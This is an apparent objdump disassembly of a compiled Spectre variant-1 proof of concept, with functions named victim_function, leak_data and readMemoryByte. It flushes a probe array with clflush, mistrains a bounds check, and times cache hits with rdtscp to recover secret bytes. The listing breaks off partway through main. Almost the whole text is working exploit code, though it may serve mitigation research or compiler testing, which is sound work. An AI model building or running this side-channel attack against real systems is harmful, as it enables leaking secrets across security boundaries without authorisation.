
spec_cl_o0.out      elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    $0x8,%rsp
  401008:	48 8b 05 e9 2f 00 00 	mov    0x2fe9(%rip),%rax        # 403ff8 <__gmon_start__@Base>
  40100f:	48 85 c0             	test   %rax,%rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   *%rax
  401016:	48 83 c4 08          	add    $0x8,%rsp
  40101a:	c3                   	ret    

Disassembly of section .plt:

0000000000401020 <getpid@plt-0x10>:
  401020:	ff 35 e2 2f 00 00    	push   0x2fe2(%rip)        # 404008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	ff 25 e4 2f 00 00    	jmp    *0x2fe4(%rip)        # 404010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401030 <getpid@plt>:
  401030:	ff 25 e2 2f 00 00    	jmp    *0x2fe2(%rip)        # 404018 <getpid@GLIBC_2.2.5>
  401036:	68 00 00 00 00       	push   $0x0
  40103b:	e9 e0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401040 <strlen@plt>:
  401040:	ff 25 da 2f 00 00    	jmp    *0x2fda(%rip)        # 404020 <strlen@GLIBC_2.2.5>
  401046:	68 01 00 00 00       	push   $0x1
  40104b:	e9 d0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401050 <printf@plt>:
  401050:	ff 25 d2 2f 00 00    	jmp    *0x2fd2(%rip)        # 404028 <printf@GLIBC_2.2.5>
  401056:	68 02 00 00 00       	push   $0x2
  40105b:	e9 c0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401060 <getchar@plt>:
  401060:	ff 25 ca 2f 00 00    	jmp    *0x2fca(%rip)        # 404030 <getchar@GLIBC_2.2.5>
  401066:	68 03 00 00 00       	push   $0x3
  40106b:	e9 b0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401070 <__isoc99_sscanf@plt>:
  401070:	ff 25 c2 2f 00 00    	jmp    *0x2fc2(%rip)        # 404038 <__isoc99_sscanf@GLIBC_2.7>
  401076:	68 04 00 00 00       	push   $0x4
  40107b:	e9 a0 ff ff ff       	jmp    401020 <_init+0x20>

Disassembly of section .text:

0000000000401080 <_start>:
  401080:	f3 0f 1e fa          	endbr64 
  401084:	31 ed                	xor    %ebp,%ebp
  401086:	49 89 d1             	mov    %rdx,%r9
  401089:	5e                   	pop    %rsi
  40108a:	48 89 e2             	mov    %rsp,%rdx
  40108d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  401091:	50                   	push   %rax
  401092:	54                   	push   %rsp
  401093:	45 31 c0             	xor    %r8d,%r8d
  401096:	31 c9                	xor    %ecx,%ecx
  401098:	48 c7 c7 80 15 40 00 	mov    $0x401580,%rdi
  40109f:	ff 15 4b 2f 00 00    	call   *0x2f4b(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.34>
  4010a5:	f4                   	hlt    
  4010a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4010ad:	00 00 00 

00000000004010b0 <_dl_relocate_static_pie>:
  4010b0:	f3 0f 1e fa          	endbr64 
  4010b4:	c3                   	ret    
  4010b5:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4010bc:	00 00 00 
  4010bf:	90                   	nop

00000000004010c0 <deregister_tm_clones>:
  4010c0:	b8 08 41 40 00       	mov    $0x404108,%eax
  4010c5:	48 3d 08 41 40 00    	cmp    $0x404108,%rax
  4010cb:	74 13                	je     4010e0 <deregister_tm_clones+0x20>
  4010cd:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d2:	48 85 c0             	test   %rax,%rax
  4010d5:	74 09                	je     4010e0 <deregister_tm_clones+0x20>
  4010d7:	bf 08 41 40 00       	mov    $0x404108,%edi
  4010dc:	ff e0                	jmp    *%rax
  4010de:	66 90                	xchg   %ax,%ax
  4010e0:	c3                   	ret    
  4010e1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4010e8:	00 00 00 00 
  4010ec:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004010f0 <register_tm_clones>:
  4010f0:	be 08 41 40 00       	mov    $0x404108,%esi
  4010f5:	48 81 ee 08 41 40 00 	sub    $0x404108,%rsi
  4010fc:	48 89 f0             	mov    %rsi,%rax
  4010ff:	48 c1 ee 3f          	shr    $0x3f,%rsi
  401103:	48 c1 f8 03          	sar    $0x3,%rax
  401107:	48 01 c6             	add    %rax,%rsi
  40110a:	48 d1 fe             	sar    %rsi
  40110d:	74 11                	je     401120 <register_tm_clones+0x30>
  40110f:	b8 00 00 00 00       	mov    $0x0,%eax
  401114:	48 85 c0             	test   %rax,%rax
  401117:	74 07                	je     401120 <register_tm_clones+0x30>
  401119:	bf 08 41 40 00       	mov    $0x404108,%edi
  40111e:	ff e0                	jmp    *%rax
  401120:	c3                   	ret    
  401121:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401128:	00 00 00 00 
  40112c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401130 <__do_global_dtors_aux>:
  401130:	f3 0f 1e fa          	endbr64 
  401134:	80 3d d5 2f 00 00 00 	cmpb   $0x0,0x2fd5(%rip)        # 404110 <completed.0>
  40113b:	75 13                	jne    401150 <__do_global_dtors_aux+0x20>
  40113d:	55                   	push   %rbp
  40113e:	48 89 e5             	mov    %rsp,%rbp
  401141:	e8 7a ff ff ff       	call   4010c0 <deregister_tm_clones>
  401146:	c6 05 c3 2f 00 00 01 	movb   $0x1,0x2fc3(%rip)        # 404110 <completed.0>
  40114d:	5d                   	pop    %rbp
  40114e:	c3                   	ret    
  40114f:	90                   	nop
  401150:	c3                   	ret    
  401151:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401158:	00 00 00 00 
  40115c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401160 <frame_dummy>:
  401160:	f3 0f 1e fa          	endbr64 
  401164:	eb 8a                	jmp    4010f0 <register_tm_clones>
  401166:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40116d:	00 00 00 

0000000000401170 <check>:
  401170:	55                   	push   %rbp
  401171:	48 89 e5             	mov    %rsp,%rbp
  401174:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
  401178:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40117c:	8b 0c 25 50 40 40 00 	mov    0x404050,%ecx
  401183:	48 63 d1             	movslq %ecx,%rdx
  401186:	48 39 d0             	cmp    %rdx,%rax
  401189:	73 09                	jae    401194 <check+0x24>
  40118b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
  401192:	eb 07                	jmp    40119b <check+0x2b>
  401194:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  40119b:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40119e:	5d                   	pop    %rbp
  40119f:	c3                   	ret    

00000000004011a0 <leak_data>:
  4011a0:	55                   	push   %rbp
  4011a1:	48 89 e5             	mov    %rsp,%rbp
  4011a4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  4011a8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  4011ac:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4011b0:	48 03 45 f0          	add    -0x10(%rbp),%rax
  4011b4:	8b 0c 25 50 40 40 00 	mov    0x404050,%ecx
  4011bb:	48 63 d1             	movslq %ecx,%rdx
  4011be:	48 39 d0             	cmp    %rdx,%rax
  4011c1:	73 2d                	jae    4011f0 <leak_data+0x50>
  4011c3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4011c7:	48 03 45 f0          	add    -0x10(%rbp),%rax
  4011cb:	0f b6 88 60 40 40 00 	movzbl 0x404060(%rax),%ecx
  4011d2:	c1 e1 09             	shl    $0x9,%ecx
  4011d5:	48 63 c1             	movslq %ecx,%rax
  4011d8:	0f b6 88 30 41 40 00 	movzbl 0x404130(%rax),%ecx
  4011df:	0f b6 14 25 20 41 40 	movzbl 0x404120,%edx
  4011e6:	00 
  4011e7:	21 ca                	and    %ecx,%edx
  4011e9:	88 14 25 20 41 40 00 	mov    %dl,0x404120
  4011f0:	5d                   	pop    %rbp
  4011f1:	c3                   	ret    
  4011f2:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4011f9:	00 00 00 
  4011fc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401200 <victim_function>:
  401200:	55                   	push   %rbp
  401201:	48 89 e5             	mov    %rsp,%rbp
  401204:	48 83 ec 10          	sub    $0x10,%rsp
  401208:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  40120c:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
  401210:	0f b6 04 25 21 41 40 	movzbl 0x404121,%eax
  401217:	00 
  401218:	89 c6                	mov    %eax,%esi
  40121a:	e8 81 ff ff ff       	call   4011a0 <leak_data>
  40121f:	48 83 c4 10          	add    $0x10,%rsp
  401223:	5d                   	pop    %rbp
  401224:	c3                   	ret    
  401225:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40122c:	00 00 00 
  40122f:	90                   	nop

0000000000401230 <readMemoryByte>:
  401230:	55                   	push   %rbp
  401231:	48 89 e5             	mov    %rsp,%rbp
  401234:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
  40123b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  40123f:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  401243:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  401247:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%rbp)
  40124e:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
  401255:	81 7d d0 00 01 00 00 	cmpl   $0x100,-0x30(%rbp)
  40125c:	7d 1a                	jge    401278 <readMemoryByte+0x48>
  40125e:	48 63 45 d0          	movslq -0x30(%rbp),%rax
  401262:	c7 04 85 30 41 42 00 	movl   $0x0,0x424130(,%rax,4)
  401269:	00 00 00 00 
  40126d:	8b 45 d0             	mov    -0x30(%rbp),%eax
  401270:	83 c0 01             	add    $0x1,%eax
  401273:	89 45 d0             	mov    %eax,-0x30(%rbp)
  401276:	eb dd                	jmp    401255 <readMemoryByte+0x25>
  401278:	c7 45 d4 e7 03 00 00 	movl   $0x3e7,-0x2c(%rbp)
  40127f:	83 7d d4 00          	cmpl   $0x0,-0x2c(%rbp)
  401283:	0f 8e a7 02 00 00    	jle    401530 <readMemoryByte+0x300>
  401289:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
  401290:	81 7d d0 00 01 00 00 	cmpl   $0x100,-0x30(%rbp)
  401297:	7d 24                	jge    4012bd <readMemoryByte+0x8d>
  401299:	8b 45 d0             	mov    -0x30(%rbp),%eax
  40129c:	c1 e0 09             	shl    $0x9,%eax
  40129f:	48 63 c8             	movslq %eax,%rcx
  4012a2:	48 ba 30 41 40 00 00 	movabs $0x404130,%rdx
  4012a9:	00 00 00 
  4012ac:	48 01 ca             	add    %rcx,%rdx
  4012af:	0f ae 3a             	clflush (%rdx)
  4012b2:	8b 45 d0             	mov    -0x30(%rbp),%eax
  4012b5:	83 c0 01             	add    $0x1,%eax
  4012b8:	89 45 d0             	mov    %eax,-0x30(%rbp)
  4012bb:	eb d3                	jmp    401290 <readMemoryByte+0x60>
  4012bd:	8b 45 d4             	mov    -0x2c(%rbp),%eax
  4012c0:	8b 0c 25 50 40 40 00 	mov    0x404050,%ecx
  4012c7:	99                   	cltd   
  4012c8:	f7 f9                	idiv   %ecx
  4012ca:	48 63 f2             	movslq %edx,%rsi
  4012cd:	48 89 75 b8          	mov    %rsi,-0x48(%rbp)
  4012d1:	c7 45 cc 1d 00 00 00 	movl   $0x1d,-0x34(%rbp)
  4012d8:	83 7d cc 00          	cmpl   $0x0,-0x34(%rbp)
  4012dc:	0f 8c 8a 00 00 00    	jl     40136c <readMemoryByte+0x13c>
  4012e2:	0f ae 3d 67 2d 00 00 	clflush 0x2d67(%rip)        # 404050 <array1_size>
  4012e9:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%rbp)
  4012f0:	8b 45 94             	mov    -0x6c(%rbp),%eax
  4012f3:	83 f8 64             	cmp    $0x64,%eax
  4012f6:	7d 0d                	jge    401305 <readMemoryByte+0xd5>
  4012f8:	eb 00                	jmp    4012fa <readMemoryByte+0xca>
  4012fa:	8b 45 94             	mov    -0x6c(%rbp),%eax
  4012fd:	83 c0 01             	add    $0x1,%eax
  401300:	89 45 94             	mov    %eax,-0x6c(%rbp)
  401303:	eb eb                	jmp    4012f0 <readMemoryByte+0xc0>
  401305:	8b 45 cc             	mov    -0x34(%rbp),%eax
  401308:	99                   	cltd   
  401309:	b9 06 00 00 00       	mov    $0x6,%ecx
  40130e:	f7 f9                	idiv   %ecx
  401310:	83 ea 01             	sub    $0x1,%edx
  401313:	81 e2 00 00 ff ff    	and    $0xffff0000,%edx
  401319:	48 63 f2             	movslq %edx,%rsi
  40131c:	48 89 75 b0          	mov    %rsi,-0x50(%rbp)
  401320:	48 8b 75 b0          	mov    -0x50(%rbp),%rsi
  401324:	48 8b 7d b0          	mov    -0x50(%rbp),%rdi
  401328:	48 c1 ef 10          	shr    $0x10,%rdi
  40132c:	48 09 fe             	or     %rdi,%rsi
  40132f:	48 89 75 b0          	mov    %rsi,-0x50(%rbp)
  401333:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
  401337:	48 8b 7d b0          	mov    -0x50(%rbp),%rdi
  40133b:	4c 8b 45 e8          	mov    -0x18(%rbp),%r8
  40133f:	4c 33 45 b8          	xor    -0x48(%rbp),%r8
  401343:	4c 21 c7             	and    %r8,%rdi
  401346:	48 31 fe             	xor    %rdi,%rsi
  401349:	48 89 75 b0          	mov    %rsi,-0x50(%rbp)
  40134d:	c6 04 25 21 41 40 00 	movb   $0x0,0x404121
  401354:	00 
  401355:	48 8b 7d b0          	mov    -0x50(%rbp),%rdi
  401359:	e8 a2 fe ff ff       	call   401200 <victim_function>
  40135e:	8b 45 cc             	mov    -0x34(%rbp),%eax
  401361:	83 c0 ff             	add    $0xffffffff,%eax
  401364:	89 45 cc             	mov    %eax,-0x34(%rbp)
  401367:	e9 6c ff ff ff       	jmp    4012d8 <readMemoryByte+0xa8>
  40136c:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
  401373:	81 7d d0 00 01 00 00 	cmpl   $0x100,-0x30(%rbp)
  40137a:	0f 8d e6 00 00 00    	jge    401466 <readMemoryByte+0x236>
  401380:	69 45 d0 a7 00 00 00 	imul   $0xa7,-0x30(%rbp),%eax
  401387:	83 c0 0d             	add    $0xd,%eax
  40138a:	25 ff 00 00 00       	and    $0xff,%eax
  40138f:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  401392:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  401395:	c1 e0 09             	shl    $0x9,%eax
  401398:	48 63 c8             	movslq %eax,%rcx
  40139b:	48 ba 30 41 40 00 00 	movabs $0x404130,%rdx
  4013a2:	00 00 00 
  4013a5:	48 01 ca             	add    %rcx,%rdx
  4013a8:	48 89 55 98          	mov    %rdx,-0x68(%rbp)
  4013ac:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
  4013b0:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
  4013b4:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  4013b8:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
  4013bc:	48 89 55 80          	mov    %rdx,-0x80(%rbp)
  4013c0:	0f 01 f9             	rdtscp 
  4013c3:	48 c1 e2 20          	shl    $0x20,%rdx
  4013c7:	48 09 d0             	or     %rdx,%rax
  4013ca:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  4013ce:	89 0a                	mov    %ecx,(%rdx)
  4013d0:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4013d4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4013d8:	40 8a 30             	mov    (%rax),%sil
  4013db:	40 0f b6 ce          	movzbl %sil,%ecx
  4013df:	89 4d c0             	mov    %ecx,-0x40(%rbp)
  4013e2:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4013e6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4013ea:	48 8b 7d f8          	mov    -0x8(%rbp),%rdi
  4013ee:	0f 01 f9             	rdtscp 
  4013f1:	48 c1 e2 20          	shl    $0x20,%rdx
  4013f5:	48 09 d0             	or     %rdx,%rax
  4013f8:	89 0f                	mov    %ecx,(%rdi)
  4013fa:	48 2b 45 a8          	sub    -0x58(%rbp),%rax
  4013fe:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  401402:	48 83 7d a0 64       	cmpq   $0x64,-0x60(%rbp)
  401407:	77 4d                	ja     401456 <readMemoryByte+0x226>
  401409:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  40140c:	8b 4d d4             	mov    -0x2c(%rbp),%ecx
  40140f:	8b 14 25 50 40 40 00 	mov    0x404050,%edx
  401416:	89 85 7c ff ff ff    	mov    %eax,-0x84(%rbp)
  40141c:	89 c8                	mov    %ecx,%eax
  40141e:	89 95 78 ff ff ff    	mov    %edx,-0x88(%rbp)
  401424:	99                   	cltd   
  401425:	8b 8d 78 ff ff ff    	mov    -0x88(%rbp),%ecx
  40142b:	f7 f9                	idiv   %ecx
  40142d:	48 63 f2             	movslq %edx,%rsi
  401430:	0f b6 96 60 40 40 00 	movzbl 0x404060(%rsi),%edx
  401437:	8b bd 7c ff ff ff    	mov    -0x84(%rbp),%edi
  40143d:	39 d7                	cmp    %edx,%edi
  40143f:	74 15                	je     401456 <readMemoryByte+0x226>
  401441:	48 63 45 c4          	movslq -0x3c(%rbp),%rax
  401445:	8b 0c 85 30 41 42 00 	mov    0x424130(,%rax,4),%ecx
  40144c:	83 c1 01             	add    $0x1,%ecx
  40144f:	89 0c 85 30 41 42 00 	mov    %ecx,0x424130(,%rax,4)
  401456:	eb 00                	jmp    401458 <readMemoryByte+0x228>
  401458:	8b 45 d0             	mov    -0x30(%rbp),%eax
  40145b:	83 c0 01             	add    $0x1,%eax
  40145e:	89 45 d0             	mov    %eax,-0x30(%rbp)
  401461:	e9 0d ff ff ff       	jmp    401373 <readMemoryByte+0x143>
  401466:	c7 45 c8 ff ff ff ff 	movl   $0xffffffff,-0x38(%rbp)
  40146d:	c7 45 cc ff ff ff ff 	movl   $0xffffffff,-0x34(%rbp)
  401474:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
  40147b:	81 7d d0 00 01 00 00 	cmpl   $0x100,-0x30(%rbp)
  401482:	7d 5f                	jge    4014e3 <readMemoryByte+0x2b3>
  401484:	83 7d cc 00          	cmpl   $0x0,-0x34(%rbp)
  401488:	7c 18                	jl     4014a2 <readMemoryByte+0x272>
  40148a:	48 63 45 d0          	movslq -0x30(%rbp),%rax
  40148e:	8b 0c 85 30 41 42 00 	mov    0x424130(,%rax,4),%ecx
  401495:	48 63 45 cc          	movslq -0x34(%rbp),%rax
  401499:	3b 0c 85 30 41 42 00 	cmp    0x424130(,%rax,4),%ecx
  4014a0:	7c 0e                	jl     4014b0 <readMemoryByte+0x280>
  4014a2:	8b 45 cc             	mov    -0x34(%rbp),%eax
  4014a5:	89 45 c8             	mov    %eax,-0x38(%rbp)
  4014a8:	8b 45 d0             	mov    -0x30(%rbp),%eax
  4014ab:	89 45 cc             	mov    %eax,-0x34(%rbp)
  4014ae:	eb 26                	jmp    4014d6 <readMemoryByte+0x2a6>
  4014b0:	83 7d c8 00          	cmpl   $0x0,-0x38(%rbp)
  4014b4:	7c 18                	jl     4014ce <readMemoryByte+0x29e>
  4014b6:	48 63 45 d0          	movslq -0x30(%rbp),%rax
  4014ba:	8b 0c 85 30 41 42 00 	mov    0x424130(,%rax,4),%ecx
  4014c1:	48 63 45 c8          	movslq -0x38(%rbp),%rax
  4014c5:	3b 0c 85 30 41 42 00 	cmp    0x424130(,%rax,4),%ecx
  4014cc:	7c 06                	jl     4014d4 <readMemoryByte+0x2a4>
  4014ce:	8b 45 d0             	mov    -0x30(%rbp),%eax
  4014d1:	89 45 c8             	mov    %eax,-0x38(%rbp)
  4014d4:	eb 00                	jmp    4014d6 <readMemoryByte+0x2a6>
  4014d6:	eb 00                	jmp    4014d8 <readMemoryByte+0x2a8>
  4014d8:	8b 45 d0             	mov    -0x30(%rbp),%eax
  4014db:	83 c0 01             	add    $0x1,%eax
  4014de:	89 45 d0             	mov    %eax,-0x30(%rbp)
  4014e1:	eb 98                	jmp    40147b <readMemoryByte+0x24b>
  4014e3:	48 63 45 cc          	movslq -0x34(%rbp),%rax
  4014e7:	8b 0c 85 30 41 42 00 	mov    0x424130(,%rax,4),%ecx
  4014ee:	48 63 45 c8          	movslq -0x38(%rbp),%rax
  4014f2:	8b 14 85 30 41 42 00 	mov    0x424130(,%rax,4),%edx
  4014f9:	d1 e2                	shl    %edx
  4014fb:	83 c2 05             	add    $0x5,%edx
  4014fe:	39 d1                	cmp    %edx,%ecx
  401500:	7d 1c                	jge    40151e <readMemoryByte+0x2ee>
  401502:	48 63 45 cc          	movslq -0x34(%rbp),%rax
  401506:	83 3c 85 30 41 42 00 	cmpl   $0x2,0x424130(,%rax,4)
  40150d:	02 
  40150e:	75 10                	jne    401520 <readMemoryByte+0x2f0>
  401510:	48 63 45 c8          	movslq -0x38(%rbp),%rax
  401514:	83 3c 85 30 41 42 00 	cmpl   $0x0,0x424130(,%rax,4)
  40151b:	00 
  40151c:	75 02                	jne    401520 <readMemoryByte+0x2f0>
  40151e:	eb 10                	jmp    401530 <readMemoryByte+0x300>
  401520:	eb 00                	jmp    401522 <readMemoryByte+0x2f2>
  401522:	8b 45 d4             	mov    -0x2c(%rbp),%eax
  401525:	83 c0 ff             	add    $0xffffffff,%eax
  401528:	89 45 d4             	mov    %eax,-0x2c(%rbp)
  40152b:	e9 4f fd ff ff       	jmp    40127f <readMemoryByte+0x4f>
  401530:	8b 45 c0             	mov    -0x40(%rbp),%eax
  401533:	33 04 25 30 41 42 00 	xor    0x424130,%eax
  40153a:	89 04 25 30 41 42 00 	mov    %eax,0x424130
  401541:	8b 45 cc             	mov    -0x34(%rbp),%eax
  401544:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  401548:	88 01                	mov    %al,(%rcx)
  40154a:	48 63 4d cc          	movslq -0x34(%rbp),%rcx
  40154e:	8b 14 8d 30 41 42 00 	mov    0x424130(,%rcx,4),%edx
  401555:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  401559:	89 11                	mov    %edx,(%rcx)
  40155b:	8b 55 c8             	mov    -0x38(%rbp),%edx
  40155e:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  401562:	88 51 01             	mov    %dl,0x1(%rcx)
  401565:	48 63 4d c8          	movslq -0x38(%rbp),%rcx
  401569:	8b 34 8d 30 41 42 00 	mov    0x424130(,%rcx,4),%esi
  401570:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  401574:	89 71 04             	mov    %esi,0x4(%rcx)
  401577:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
  40157e:	5d                   	pop    %rbp
  40157f:	c3                   	ret    

0000000000401580 <main>:
  401580:	55                   	push   %rbp
  401581:	48 89 e5             	mov    %rsp,%rbp
  401584:	48 83 ec 60          	sub    $0x60,%rsp
  401588:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  40158f:	89 7d f8             	mov    %edi,-0x8(%rbp)
  401592:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  401596:	c6 04 25 21 41 40 00 	movb   $0x5,0x404121
  40159d:	05 
  40159e:	e8 bd fa ff ff       	call   401060 <getchar@plt>
  4015a3:	88 45 ef             	mov    %al,-0x11(%rbp)
  4015a6:	0f be 4d ef          	movsbl -0x11(%rbp),%ecx
  4015aa:	83 f9 72             	cmp    $0x72,%ecx
  4015ad:	0f 85 57 02 00 00    	jne    40180a <main+0x28a>
  4015b3:	48 8b 34 25 00 41 40 	mov    0x404100,%rsi
  4015ba:	00 
  4015bb:	48 8b 14 25 00 41 40 	mov    0x404100,%rdx
  4015c2:	00 
  4015c3:	48 bf 2d 20 40 00 00 	movabs $0x40202d,%rdi
  4015ca:	00 00 00 
  4015cd:	b0 00                	mov    $0x0,%al
  4015cf:	e8 7c fa ff ff       	call   401050 <printf@plt>
  4015d4:	48 8b 0c 25 00 41 40 	mov    0x404100,%rcx
  4015db:	00 
  4015dc:	48 ba 60 40 40 00 00 	movabs $0x404060,%rdx
  4015e3:	00 00 00 
  4015e6:	48 29 d1             	sub    %rdx,%rcx
  4015e9:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
  4015ed:	48 8b 3c 25 00 41 40 	mov    0x404100,%rdi
  4015f4:	00 
  4015f5:	89 45 c0             	mov    %eax,-0x40(%rbp)
  4015f8:	e8 43 fa ff ff       	call   401040 <strlen@plt>
  4015fd:	89 45 d4             	mov    %eax,-0x2c(%rbp)
  401600:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
  401607:	00 
  401608:	48 81 7d c8 00 00 02 	cmpq   $0x20000,-0x38(%rbp)
  40160f:	00 
  401610:	73 19                	jae    40162b <main+0xab>
  401612:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  401616:	c6 80 30 41 40 00 01 	movb   $0x1,0x404130(%rax)
  40161d:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  401621:	48 83 c0 01          	add    $0x1,%rax
  401625:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  401629:	eb dd                	jmp    401608 <main+0x88>
  40162b:	83 7d f8 03          	cmpl   $0x3,-0x8(%rbp)
  40162f:	75 70                	jne    4016a1 <main+0x121>
  401631:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401635:	48 8b 78 08          	mov    0x8(%rax),%rdi
  401639:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  40163d:	48 be 51 20 40 00 00 	movabs $0x402051,%rsi
  401644:	00 00 00 
  401647:	48 89 c2             	mov    %rax,%rdx
  40164a:	b0 00                	mov    $0x0,%al
  40164c:	e8 1f fa ff ff       	call   401070 <__isoc99_sscanf@plt>
  401651:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  401655:	48 ba 60 40 40 00 00 	movabs $0x404060,%rdx
  40165c:	00 00 00 
  40165f:	48 29 d1             	sub    %rdx,%rcx
  401662:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
  401666:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  40166a:	48 8b 79 10          	mov    0x10(%rcx),%rdi
  40166e:	48 be 54 20 40 00 00 	movabs $0x402054,%rsi
  401675:	00 00 00 
  401678:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
  40167c:	89 45 bc             	mov    %eax,-0x44(%rbp)
  40167f:	b0 00                	mov    $0x0,%al
  401681:	e8 ea f9 ff ff       	call   401070 <__isoc99_sscanf@plt>
  401686:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  40168a:	8b 55 d4             	mov    -0x2c(%rbp),%edx
  40168d:	48 bf 57 20 40 00 00 	movabs $0x402057,%rdi
  401694:	00 00 00 
  401697:	89 45 b8             	mov    %eax,-0x48(%rbp)
  40169a:	b0 00                	mov    $0x0,%al
  40169c:	e8 af f9 ff ff       	call   401050 <printf@plt>
  4016a1:	8b 75 d4             	mov    -0x2c(%rbp),%esi
  4016a4:	48 bf 7a 20 40 00 00 	movabs $0x40207a,%rdi
  4016ab:	00 00 00 
  4016ae:	b0 00                	mov    $0x0,%al
  4016b0:	e8 9b f9 ff ff       	call   401050 <printf@plt>
  4016b5:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
  4016bc:	8b 45 d4             	mov    -0x2c(%rbp),%eax
  4016bf:	83 c0 ff             	add    $0xffffffff,%eax
  4016c2:	89 45 d4             	mov    %eax,-0x2c(%rbp)
  4016c5:	83 f8 00             	cmp    $0x0,%eax
  4016c8:	0f 8c 3a 01 00 00    	jl     401808 <main+0x288>
  4016ce:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  4016d2:	48 8b 04 25 00 41 40 	mov    0x404100,%rax
  4016d9:	00 
  4016da:	48 63 4d c4          	movslq -0x3c(%rbp),%rcx
  4016de:	0f be 14 08          	movsbl (%rax,%rcx,1),%edx
  4016e2:	48 bf 8d 20 40 00 00 	movabs $0x40208d,%rdi
  4016e9:	00 00 00 
  4016ec:	b0 00                	mov    $0x0,%al
  4016ee:	e8 5d f9 ff ff       	call   401050 <printf@plt>
  4016f3:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  4016f7:	48 8d 75 d2          	lea    -0x2e(%rbp),%rsi
  4016fb:	44 8b 45 c4          	mov    -0x3c(%rbp),%r8d
  4016ff:	41 83 c0 01          	add    $0x1,%r8d
  401703:	44 89 45 c4          	mov    %r8d,-0x3c(%rbp)
  401707:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  40170b:	48 89 cf             	mov    %rcx,%rdi
  40170e:	48 83 c7 01          	add    $0x1,%rdi
  401712:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
  401716:	48 89 cf             	mov    %rcx,%rdi
  401719:	89 45 b4             	mov    %eax,-0x4c(%rbp)
  40171c:	e8 0f fb ff ff       	call   401230 <readMemoryByte>
  401721:	8b 45 d8             	mov    -0x28(%rbp),%eax
